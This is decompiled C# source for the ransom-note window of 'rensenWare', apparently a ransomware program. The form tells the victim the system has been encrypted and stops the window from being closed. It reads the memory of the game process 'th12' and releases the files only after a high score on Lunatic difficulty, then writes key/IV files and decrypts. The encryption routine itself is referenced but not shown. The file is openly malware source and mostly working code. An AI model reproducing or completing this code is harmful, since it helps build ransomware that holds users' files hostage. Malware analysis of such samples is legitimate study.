using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using rensenWare.Properties;

namespace rensenWare;

public class frmWarning : Form
{
	private bool _flag;

	private bool _flag_billion;

	private IntPtr _handle;

	private IContainer components;

	private Label MessageHeader;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private GroupBox groupBox1;

	private ProgressBar decryptProgress;

	private Label DecryptStatus;

	private Label DecryptStatusLabel;

	private Label ScoreStatus;

	private Label ScoreLabel;

	private Label ProcStatus;

	private Label StatusLabel;

	private PictureBox pictureBox1;

	private Button ButtonExit;

	private Button ButtonManualDecrypt;

	public bool flag
	{
		get
		{
			return _flag;
		}
		set
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Expected O, but got Unknown
			_flag = value;
			if (_flag)
			{
				((Control)ProcStatus).Invoke((Delegate)(MethodInvoker)delegate
				{
					((Control)ProcStatus).set_Text("Detected");
				});
			}
			else
			{
				((Control)ProcStatus).Invoke((Delegate)(MethodInvoker)delegate
				{
					((Control)ProcStatus).set_Text("Process Killed!");
				});
			}
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
	private static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

	public frmWarning()
	{
		InitializeComponent();
		new Thread((ThreadStart)delegate
		{
			//IL_0076: Unknown result type (might be due to invalid IL or missing references)
			//IL_0080: Expected O, but got Unknown
			//IL_009a: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a4: Expected O, but got Unknown
			//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ef: Expected O, but got Unknown
			//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
			//IL_01cd: Expected O, but got Unknown
			//IL_021f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0229: Expected O, but got Unknown
			while (true)
			{
				if (flag)
				{
					if (_flag_billion)
					{
						break;
					}
					int lpNumberOfBytesRead = 0;
					byte[] _buffer = new byte[4];
					if (!ReadProcessMemory((int)_handle, 4910032, _buffer, 2, ref lpNumberOfBytesRead))
					{
						flag = false;
						continue;
					}
					if (BitConverter.ToInt16(_buffer, 0) != 3)
					{
						((Control)ProcStatus).Invoke((Delegate)(MethodInvoker)delegate
						{
							((Control)ProcStatus).set_Text("NOT LUNATIC LEVEL!");
						});
						Thread.Sleep(100);
						continue;
					}
					((Control)ProcStatus).Invoke((Delegate)(MethodInvoker)delegate
					{
						((Control)ProcStatus).set_Text("Process Working");
					});
					if (!ReadProcessMemory((int)_handle, 4918340, _buffer, 4, ref lpNumberOfBytesRead))
					{
						flag = false;
						Thread.Sleep(100);
						continue;
					}
					((Control)ScoreStatus).Invoke((Delegate)(MethodInvoker)delegate
					{
						((Control)ScoreStatus).set_Text((BitConverter.ToInt32(_buffer, 0) * 10).ToString());
					});
					if (BitConverter.ToInt32(_buffer, 0) > 20000000)
					{
						_flag_billion = true;
					}
					else
					{
						_buffer = null;
					}
					Thread.Sleep(100);
				}
				else
				{
					Process[] processesByName = Process.GetProcessesByName("th12");
					if (processesByName.Length != 0)
					{
						_handle = OpenProcess(16, bInheritHandle: false, processesByName.FirstOrDefault()!.Id);
						flag = true;
					}
				}
				Thread.Sleep(100);
			}
			File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
			File.WriteAllBytes(Program.IVFilePath, Program.randomIV);
			decryptProgress.set_Maximum(Program.encryptedFiles.Count);
			foreach (string path in Program.encryptedFiles)
			{
				try
				{
					((Control)DecryptStatus).Invoke((Delegate)(MethodInvoker)delegate
					{
						((Control)DecryptStatus).set_Text(Path.GetFileName(path));
					});
					Program.Crypt(path, IsDecrypt: true);
					ProgressBar obj = decryptProgress;
					int value = obj.get_Value();
					obj.set_Value(value + 1);
					Thread.Sleep(100);
				}
				catch
				{
				}
			}
			((Control)this).Invoke((Delegate)(MethodInvoker)delegate
			{
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
				((Control)ButtonManualDecrypt).set_Visible(true);
				((Control)ButtonExit).set_Visible(true);
			});
		}).Start();
	}

	private void Prevent(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void ButtonExit_Click(object sender, EventArgs e)
	{
		Environment.Exit(0);
	}

	private void ButtonManualDecrypt_Click(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		((Form)new frmManualDecrypter()).ShowDialog((IWin32Window)(object)this);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Expected O, but got Unknown
		//IL_01ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Expected O, but got Unknown
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Expected O, but got Unknown
		//IL_02f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		//IL_0370: Unknown result type (might be due to invalid IL or missing references)
		//IL_037a: Expected O, but got Unknown
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_0805: Unknown result type (might be due to invalid IL or missing references)
		//IL_080f: Expected O, but got Unknown
		//IL_08ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b8: Expected O, but got Unknown
		//IL_0a80: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a8a: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmWarning));
		MessageHeader = new Label();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		groupBox1 = new GroupBox();
		decryptProgress = new ProgressBar();
		DecryptStatus = new Label();
		DecryptStatusLabel = new Label();
		ScoreStatus = new Label();
		ScoreLabel = new Label();
		ProcStatus = new Label();
		StatusLabel = new Label();
		pictureBox1 = new PictureBox();
		ButtonExit = new Button();
		ButtonManualDecrypt = new Button();
		((Control)groupBox1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)MessageHeader).set_Font(new Font("Consolas", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)MessageHeader).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)MessageHeader).set_Location(new Point(12, 9));
		((Control)MessageHeader).set_Name("MessageHeader");
		((Control)MessageHeader).set_Size(new Size(575, 79));
		((Control)MessageHeader).set_TabIndex(0);
		((Control)MessageHeader).set_Text("WARNING!");
		MessageHeader.set_TextAlign((ContentAlignment)32);
		((Control)label1).set_Font(new Font("Consolas", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(23, 88));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(564, 23));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Your system have been encrypted by Rensenware!");
		((Control)label2).set_Font(new Font("Consolas", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(241, 126));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(346, 23));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("What the HELL is it?");
		((Control)label3).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(243, 160));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(344, 94));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		((Control)label4).set_Font(new Font("Consolas", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(240, 259));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(346, 23));
		((Control)label4).set_TabIndex(1);
		((Control)label4).set_Text("How can I recover my files?");
		((Control)label5).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(242, 293));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(344, 91));
		((Control)label5).set_TabIndex(2);
		((Control)label5).set_Text(componentResourceManager.GetString("label5.Text"));
		((Control)groupBox1).get_Controls().Add((Control)(object)decryptProgress);
		((Control)groupBox1).get_Controls().Add((Control)(object)DecryptStatus);
		((Control)groupBox1).get_Controls().Add((Control)(object)DecryptStatusLabel);
		((Control)groupBox1).get_Controls().Add((Control)(object)ScoreStatus);
		((Control)groupBox1).get_Controls().Add((Control)(object)ScoreLabel);
		((Control)groupBox1).get_Controls().Add((Control)(object)ProcStatus);
		((Control)groupBox1).get_Controls().Add((Control)(object)StatusLabel);
		((Control)groupBox1).set_Font(new Font("Consolas", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)groupBox1).set_Location(new Point(244, 393));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(342, 142));
		((Control)groupBox1).set_TabIndex(3);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Status");
		((Control)decryptProgress).set_Location(new Point(6, 97));
		((Control)decryptProgress).set_Name("decryptProgress");
		((Control)decryptProgress).set_Size(new Size(326, 23));
		((Control)decryptProgress).set_TabIndex(1);
		((Control)DecryptStatus).set_Location(new Point(111, 73));
		((Control)DecryptStatus).set_Name("DecryptStatus");
		((Control)DecryptStatus).set_Size(new Size(221, 15));
		((Control)DecryptStatus).set_TabIndex(0);
		((Control)DecryptStatus).set_Text("Not Approved!");
		((Control)DecryptStatusLabel).set_AutoSize(true);
		((Control)DecryptStatusLabel).set_Location(new Point(7, 73));
		((Control)DecryptStatusLabel).set_Name("DecryptStatusLabel");
		((Control)DecryptStatusLabel).set_Size(new Size(98, 15));
		((Control)DecryptStatusLabel).set_TabIndex(0);
		((Control)DecryptStatusLabel).set_Text("Decryption : ");
		((Control)ScoreStatus).set_AutoSize(true);
		((Control)ScoreStatus).set_Location(new Point(69, 48));
		((Control)ScoreStatus).set_Name("ScoreStatus");
		((Control)ScoreStatus).set_Size(new Size(119, 15));
		((Control)ScoreStatus).set_TabIndex(0);
		((Control)ScoreStatus).set_Text("TH12 Not Started");
		((Control)ScoreLabel).set_AutoSize(true);
		((Control)ScoreLabel).set_Location(new Point(7, 48));
		((Control)ScoreLabel).set_Name("ScoreLabel");
		((Control)ScoreLabel).set_Size(new Size(56, 15));
		((Control)ScoreLabel).set_TabIndex(0);
		((Control)ScoreLabel).set_Text("Score :");
		((Control)ProcStatus).set_AutoSize(true);
		((Control)ProcStatus).set_Location(new Point(174, 23));
		((Control)ProcStatus).set_Name("ProcStatus");
		((Control)ProcStatus).set_Size(new Size(70, 15));
		((Control)ProcStatus).set_TabIndex(0);
		((Control)ProcStatus).set_Text("Not Found");
		((Control)StatusLabel).set_AutoSize(true);
		((Control)StatusLabel).set_Location(new Point(7, 23));
		((Control)StatusLabel).set_Name("StatusLabel");
		((Control)StatusLabel).set_Size(new Size(161, 15));
		((Control)StatusLabel).set_TabIndex(0);
		((Control)StatusLabel).set_Text("TH12 Process Status : ");
		pictureBox1.set_Image((Image)(object)Resources._004a588d52111875951f77e2f97c7afe43481c8ce419a94368c24472bfc5c1ee);
		((Control)pictureBox1).set_Location(new Point(25, 126));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(209, 409));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		((Control)ButtonExit).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ButtonExit).set_Location(new Point(410, 543));
		((Control)ButtonExit).set_Name("ButtonExit");
		((Control)ButtonExit).set_Size(new Size(176, 47));
		((Control)ButtonExit).set_TabIndex(7);
		((Control)ButtonExit).set_Text("Exit");
		((ButtonBase)ButtonExit).set_UseVisualStyleBackColor(true);
		((Control)ButtonExit).set_Visible(false);
		((Control)ButtonExit).add_Click((EventHandler)ButtonExit_Click);
		((Control)ButtonManualDecrypt).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ButtonManualDecrypt).set_Location(new Point(228, 543));
		((Control)ButtonManualDecrypt).set_Name("ButtonManualDecrypt");
		((Control)ButtonManualDecrypt).set_Size(new Size(176, 47));
		((Control)ButtonManualDecrypt).set_TabIndex(7);
		((Control)ButtonManualDecrypt).set_Text("Manual Decrypter");
		((ButtonBase)ButtonManualDecrypt).set_UseVisualStyleBackColor(true);
		((Control)ButtonManualDecrypt).set_Visible(false);
		((Control)ButtonManualDecrypt).add_Click((EventHandler)ButtonManualDecrypt_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(591, 596));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ButtonManualDecrypt);
		((Control)this).get_Controls().Add((Control)(object)ButtonExit);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)MessageHeader);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmWarning");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Rensenware WARNING!");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Prevent));
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
